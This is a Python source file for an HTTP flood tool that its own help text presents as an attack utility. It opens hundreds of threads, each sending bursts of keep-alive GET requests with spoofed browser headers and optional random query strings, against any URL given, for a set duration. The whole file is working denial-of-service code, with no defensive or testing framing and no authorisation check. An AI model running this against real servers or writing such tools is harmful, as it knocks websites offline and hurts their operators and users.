import socket
import time
import threading
import sys
import random
import ssl

accpetheader = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
		"Accept-Encoding: gzip, deflate",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1"]

useragents = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
]

strings = "abcdefghijklmnopqrstuvwxyzABCDEFGHJIKLMNOPQRSTUVWXYZ1234567890"

def stats():
    global rps
    while True:
        rps = 0
        time.sleep(1)
        print(f"[+] Requests Per Second - {str(rps)} [+]", end="\r")

def urlparse(url):
    global target
    global port
    global path
    if url[:7] == "http://":
        port = 80
        url = url[7:]
    if url[:8] == "https://":
        port = 443
        url = url[8:]
    target = url.split("/")
    try:
        path = "/"+target[1]
    except:
        path = "/"
    target = target[0]

def PrintHelp():
    print("""
    --help           show this help
    --host           put the target url
                     Example: --host https://www.yoursite.tld/
    --port           port to attack on (leave blank to choose port for you)
                     Example: --port 8080
    --threads        number of threads to attack with
                     Example: --threads 500
    --duration       time in seconds before flood finishes
                     Example: --duration 120
    --handshake      does the full http handshake
    --rpc            number of requests to send in each connection
                     Example: --rpc 64
    --rand-queries   random queries (12 strings)

    #-------------------------------------------------#
    #      https://github.com/MrRage867/HttpLoad/     #
    #-------------------------------------------------#
    """)

def RandomString():
    string = ""
    for x in range(12):
        string += random.choice(strings)
    return string

def flood():
    global rps
    if "?" in path:
        addquery = "&"
    else:
        addquery = "?"
    useragent = random.choice(useragents)
    accept = random.choice(accpetheader)
    timeout = time.time() + 1 * int(duration)
    while time.time() < timeout:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.settimeout(5)
        try:
            connection.connect((target, port))
            if port == 443:
                connection = ssl.create_default_context().wrap_socket(connection, server_hostname=target)
            if fullhandshake == False:
                if randqueries == False:
                    for x in range(rpc):
                        connection.send(str.encode(f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                        rps += 1
            if fullhandshake == True:
                if randqueries == False:
                    for x in range(rpc):
                        connection.send(str.encode(f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                        connection.recv(1024).decode()
                        rps += 1
            if fullhandshake == False:
                if randqueries == True:
                    for x in range(rpc):
                        connection.send(str.encode(f"GET {path}{addquery}{RandomString()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                        rps += 1
            if fullhandshake == True:
                if randqueries == True:
                    for x in range(rpc):
                        connection.send(str.encode(f"GET {path}{addquery}{RandomString()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\n{accept}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nCache-Control: max-age=0\r\n\r\n"))
                        connection.recv(1024).decode()
                        rps += 1
        except:
            connection.close()

def main():
    global duration
    global path
    global port
    global randqueries
    global fullhandshake
    global rpc
    path = ""
    threads = 800
    duration = 60
    rpc = 64
    randqueries = False
    fullhandshake = False
    help = False
    for x,args in enumerate(sys.argv):
        if args == "-help" or args == "-h" or args == "--help" or args == "--h":
            help = True
        if args == "-host" or args == "--host":
            try:
                urlparse(sys.argv[x+1])
            except:
                sys.exit("\nHost is not defined after using --host argument\n")
        if args == "-port" or args == "--port":
            try:
                port = int(sys.argv[x+1])
            except:
                sys.exit("\nPort must be an integer\n")
        if args == "-threads" or args == "--threads":
            try:
                threads = int(sys.argv[x+1])
            except:
                sys.exit("\nThreads must be an ineger\n")
        if args == "-duration" or args == "--duration":
            try:
                duration = float(sys.argv[x+1])
            except:
                sys.exit("\Duration must be an ineger\n")
        if args == "-handshake" or args == "--handshake":
            fullhandshake = True
        if args == "-rpc" or args == "--rpc":
            try:
                rpc = int(sys.argv[x+1])
            except:
                sys.exit("\nRPC must be an ineger\n")
        if args == "-rand-queries" or args == "--rand-queries":
            randqueries = True
    if help == True:
        sys.exit(PrintHelp())
    elif path == "":
        sys.exit(PrintHelp())
    else:
        threading.Thread(target=stats, daemon=True).start()
        for x in range(threads):
            th = threading.Thread(target=flood, daemon=True).start()
        timeout = time.time() + 1 * int(duration)
        while time.time() < timeout:
            try:
                time.sleep(0.05)
            except KeyboardInterrupt:
                sys.exit()
if __name__ == "__main__":
    main()
